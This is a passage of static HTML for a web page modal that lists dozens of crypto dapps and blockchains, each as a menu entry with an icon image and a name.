                            <span class="modal-el-desc-first">Scamfari</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="socllydev" src="./img/SocllyDev.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SocllyDev</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="arttaca" src="./img/Arttaca.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Arttaca</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mantle delegates" src="./img/Mantle_Delegates.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Mantle Delegates</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="vesper finance" src="./img/Vesper_Finance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Vesper Finance</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="makersplace" src="./img/MakersPlace.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MakersPlace</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="monerium." src="./img/Monerium_.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Monerium.</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sanr" src="./img/SanR.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SanR</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dydx bridge" src="./img/DyDx_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DyDx Bridge</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="onchainvision" src="./img/ONCHAINVISION.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ONCHAINVISION</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="think in coin" src="./img/Think_in_Coin.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Think in Coin</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="basedapp" src="./img/BasedApp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BasedApp</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="phase" src="./img/Phase.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Phase</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="spark" src="./img/Spark.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Spark</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="koincity" src="./img/Koincity.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Koincity</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="lan air drop" src="./img/LAN_Air_Drop.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LAN Air Drop</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dreambyt3" src="./img/DreamByt3.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DreamByt3</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cryptomintex" src="./img/Cryptomintex.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cryptomintex</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="endemic" src="./img/Endemic.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Endemic</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coinfactory" src="./img/CoinFactory.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">CoinFactory</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dhealth update" src="./img/dHealth_Update.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">dHealth Update</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="p256" src="./img/p256.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">p256</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="crypto gift" src="./img/Crypto_Gift.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Crypto Gift</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="flash staking" src="./img/Flash_Staking.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Flash Staking</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="overnight" src="./img/Overnight.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Overnight</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="chainarq" src="./img/ChainArQ.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ChainArQ</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="wasd sandbox" src="./img/WASD_Sandbox.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">WASD Sandbox</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="decentradb" src="./img/DecentraDB.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DecentraDB</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="scarab" src="./img/Scarab.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Scarab</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zkme" src="./img/zkMe.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">zkMe</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mini-bridge" src="./img/mini_bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">mini-bridge</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="create mona" src="./img/Create_Mona.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Create Mona</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zien" src="./img/Zien.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zien</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="farmswap" src="./img/farmswap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">farmswap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cow swap" src="./img/CoW_Swap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">CoW Swap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="de.fi" src="./img/De_Fi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">De.Fi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kinetix finance" src="./img/Kinetix_Finance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kinetix Finance</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ysmarkets" src="./img/ysmarkets.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ysmarkets</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aidicraft" src="./img/AidiCraft.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AidiCraft</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="air3" src="./img/Air3.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Air3</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="x-world" src="./img/X_World.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">X-World</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="uincubator" src="./img/Uincubator.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Uincubator</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="the tribe" src="./img/The_Tribe.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">The Tribe</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pomelo bounties" src="./img/Pomelo_Bounties.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Pomelo Bounties</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="moonpass" src="./img/Moonpass.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Moonpass</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="failsafe | wallet firewall" src="./img/FailSafe_Wallet_Firewall.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">FailSafe | Wallet Firewall</span
              >
            </div>
          </div>

          <div class="menu-el">
            <div class="modal-icon">
              <img
                alt="kyberswap"
                src="./img/KyberSwap.png"
              />
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">KyberSwap</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stakedflip" src="./img/StakedFlip.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">StakedFlip</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="splits" src="./img/Splits.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Splits</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="chainnodes app" src="./img/Chainnodes_App.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Chainnodes App</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="morpho" src="./img/Morpho.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Morpho</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="forge" src="./img/Forge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Forge</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dbot" src="./img/DBot.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DBot</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="unstoppable domains dapp" src="./img/Unstoppable_Domains_Dapp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Unstoppable Domains Dapp</span
              >
            </div>
          </div>
          <div class="menu-el">
            <div class="modal-icon">
              <img
                alt="evm wallets ks"
                src="./img/EVM_Wallets_KS.png"
              />
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">EVM Wallets KS</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="revv.gg" src="./img/Revv_gg.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Revv.gg</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stasis webapp" src="./img/Stasis_Webapp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Stasis Webapp</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="roi" src="./img/Roi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Roi</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="violet" src="./img/Violet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Violet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stackerai" src="./img/STACKERAI.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">STACKERAI</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="swap beauty" src="./img/Swap_beauty.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Swap beauty</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="orna.art" src="./img/Orna_art.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Orna.art</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tealswap" src="./img/Tealswap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tealswap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="web3xms.com" src="./img/web3xms_com.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">web3xms.com</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="jasiri dapp" src="./img/JASIRI_dApp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">JASIRI dApp</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="babydoge swap" src="./img/BabyDoge_Swap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BabyDoge Swap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="prcaswap" src="./img/PrcaSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PrcaSwap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pulsefurio" src="./img/PulseFurio.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PulseFurio</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stakease" src="./img/Stakease.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Stakease</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kona protocol" src="./img/Kona_Protocol.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kona Protocol</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nifby" src="./img/Nifby.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Nifby</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aime" src="./img/AIME.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AIME</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="lux explorer" src="./img/Lux_Explorer.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Lux Explorer</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pikapixel" src="./img/PikaPixel.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PikaPixel</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="moonspincom" src="./img/MoonspinCOM.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MoonspinCOM</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="webverse" src="./img/WEBVERSE.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">WEBVERSE</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="guild.xyz" src="./img/guild_xyz.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">guild.xyz</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="space id" src="./img/SPACE_ID.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SPACE ID</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dex toys" src="./img/DEX_TOYS.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DEX TOYS</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zenox" src="./img/Zenox.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zenox</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="grtwines" src="./img/GrtWines.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">GrtWines</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pgn" src="./img/PGN.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PGN</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="paradigma education" src="./img/Paradigma_Education.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Paradigma Education</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rareboard" src="./img/Rareboard.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Rareboard</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="halotrade staging" src="./img/Halotrade_Staging.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Halotrade Staging</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="blox" src="./img/Blox.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Blox</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pigo dapp" src="./img/PiGO_DAPP.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PiGO DAPP</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="athena cert" src="./img/Athena_Cert.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Athena Cert</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tetra lounge" src="./img/Tetra_Lounge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tetra Lounge</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="scb" src="./img/SCB.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SCB</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="chzdomains" src="./img/CHZDomains.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">CHZDomains</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="legobit" src="./img/LEGOBIT.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LEGOBIT</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="real" src="./img/REAL.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">REAL</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="betiro" src="./img/Betiro.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Betiro</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fusion trade" src="./img/Fusion_Trade.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fusion Trade</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="merkle trade" src="./img/Merkle_Trade.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Merkle Trade</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pheasant network" src="./img/Pheasant_Network.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Pheasant Network</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="crashino" src="./img/Crashino.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Crashino</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="velas domains" src="./img/Velas_Domains.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Velas Domains</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="eflt" src="./img/EFLT.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">EFLT</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cadabra" src="./img/Cadabra.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cadabra</span>
                        </div>
                    </div>
                </div>

                <div class="modal-main-menu" id="chains-container">
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitcoin" src="./img/Bitcoin.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitcoin</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ethereum" src="./img/Ethereum.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ethereum</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bnb chain" src="./img/BNB_Chain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BNB Chain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ripple" src="./img/Ripple.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ripple</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="solana" src="./img/Solana.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Solana</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cardano" src="./img/Cardano.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cardano</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="doge coin" src="./img/Doge_Coin.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Doge Coin</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tron" src="./img/Tron.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tron</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="avalanche c-chain" src="./img/Avalanche_C_Chain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Avalanche C-Chain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="polygon" src="./img/Polygon.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Polygon</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="polkadot" src="./img/Polkadot.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Polkadot</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="litecoin" src="./img/Litecoin.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Litecoin</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitcoin cash" src="./img/Bitcoin_Cash.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitcoin Cash</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cosmos" src="./img/Cosmos.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cosmos</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stellar" src="./img/Stellar.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Stellar</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ethereum classic" src="./img/Ethereum_Classic.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ethereum Classic</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cronos" src="./img/Cronos.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cronos</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="near" src="./img/Near.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Near</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="vechain" src="./img/VeChain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">VeChain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kucoin community chain" src="./img/Kucoin_Community_Chain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kucoin Community Chain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="theta" src="./img/Theta.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Theta</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fantom" src="./img/Fantom.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fantom</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="neo" src="./img/Neo.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Neo</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="xdc" src="./img/XDC.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">XDC</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="klay" src="./img/KLAY.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">KLAY</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zcash" src="./img/Zcash.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zcash</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dash" src="./img/Dash.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Dash</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="qtum" src="./img/Qtum.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Qtum</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ethereumpow" src="./img/EthereumPoW.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">EthereumPoW</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="celo" src="./img/Celo.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Celo</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="moonbeam" src="./img/Moonbeam.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Moonbeam</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="polkadot" src="./img/Polkadot.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Polkadot</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="harmony" src="./img/Harmony.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Harmony</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nervos" src="./img/Nervos.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Nervos</span>
                        </div>
                    </div>
